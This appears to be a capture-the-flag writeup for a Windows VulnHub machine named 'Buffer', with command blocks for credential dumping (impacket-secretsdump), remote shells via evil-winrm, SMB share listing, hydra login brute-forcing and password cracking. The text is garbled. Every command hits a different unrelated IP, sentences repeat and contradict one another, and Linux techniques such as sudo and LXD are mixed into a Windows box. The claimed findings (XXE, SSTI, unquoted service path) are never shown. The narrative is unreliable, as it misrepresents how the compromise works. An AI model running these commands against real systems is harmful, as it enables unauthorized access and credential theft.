---
TitleSEO: "VulnHub — Buffer (Easy Windows) | ZureFX"
TitlePost: "VulnHub — Buffer (Easy Windows)"
Author: "ZureFX"
Description: "Full writeup for VulnHub Buffer. Unquoted Service Path and XXE to achieve easy compromise on Windows."
Keywords: "medium, easy, hard, windows, insane, forensics"
URL: "https://zurefx.github.io/writeups/htb-buffer-532.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-buffer-532/"
Date: "2024-12-15"
Tags: "Medium, Easy, Hard, Windows, Insane, Forensics"
Section: "writeups"
Lang: "en"
main_img: "htb-buffer-532"
Permalink: "/writeups/htb-buffer-532.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Buffer** is rated **Easy** on VulnHub. It runs **Windows** and the IP address during this analysis was `10.49.167.118`.

### Objectives

Network traffic analysis revealed unencrypted communications containing user credentials. The target system was identified as running a vulnerable version of the service.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.72.53.16
crackmapexec smb 10.20.105.156 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.105.43.54/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.29.151.31/FUZZ
```

Privilege escalation was possible due to misconfigured sudo permissions. Lateral movement was facilitated by reusing discovered credentials across services.

### Service Enumeration

Token impersonation allowed elevation to SYSTEM privileges on the target. The database credentials were hardcoded in the application source code. Initial enumeration revealed several interesting open ports on the target.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.57.109.141/FUZZ
evil-winrm -i 10.74.95.66 -u administrator -p 'P@ssw0rd!'
```

Weak file permissions allowed modification of critical system files. Initial enumeration revealed several interesting open ports on the target.

### SMB Enumeration

The target system was identified as running a vulnerable version of the service. The database credentials were hardcoded in the application source code.

```bash
crackmapexec smb 10.125.160.40 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p9200,27017,3306 10.38.182.188 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.64.212.80
```

The service account had excessive permissions assigned in Active Directory. Initial enumeration revealed several interesting open ports on the target. Unconstrained delegation was enabled on the compromised machine.

## Exploitation

### Vulnerability Identification

Unconstrained delegation was enabled on the compromised machine. The web application was vulnerable to Server-Side Template Injection (SSTI). The web application was vulnerable to Server-Side Template Injection (SSTI).

Key finding: **Unquoted Service Path**.

Initial enumeration revealed several interesting open ports on the target. The backup files contained sensitive information that should not have been accessible.

### Initial Access

Group Policy Preferences contained encrypted but recoverable credentials. Unconstrained delegation was enabled on the compromised machine.

```bash
nmap -sCV -p9200,53,445 10.106.136.216 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.84.27.144/FUZZ
nmap -sCV -p25,25,464 10.86.37.48 -oN scan.txt
```

The kernel version was outdated and vulnerable to a publicly known exploit. Post-exploitation enumeration revealed a path to domain administrator privileges. The application stored sensitive credentials in an unencrypted configuration file.

## Privilege Escalation

### Enumeration

Command injection was possible through unsanitized user input in the search functionality. The service was running without proper input validation, leading to injection vulnerabilities. The web application was vulnerable to Server-Side Template Injection (SSTI).

```powershell
evil-winrm -i 10.54.179.7 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.47.142.90/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.64.137.203 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Exploitation

Privilege escalation was possible due to misconfigured sudo permissions. The database credentials were hardcoded in the application source code.

```powershell
nmap -sCV -p139,8080,443 10.104.2.223 -oN scan.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
nmap -sCV -p143,143,389 10.129.18.240 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.37.123.197/FUZZ
```

Group Policy Preferences contained encrypted but recoverable credentials. The database credentials were hardcoded in the application source code.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Token impersonation allowed elevation to SYSTEM privileges on the target. Unconstrained delegation was enabled on the compromised machine.

## Summary

### Tools Used

- `sharphound`
- `impacket`
- `pwncat`
- `psexec`

### Key Takeaways

- Unquoted Service Path
- XXE
- AlwaysInstallElevated
- LXD Privilege Escalation
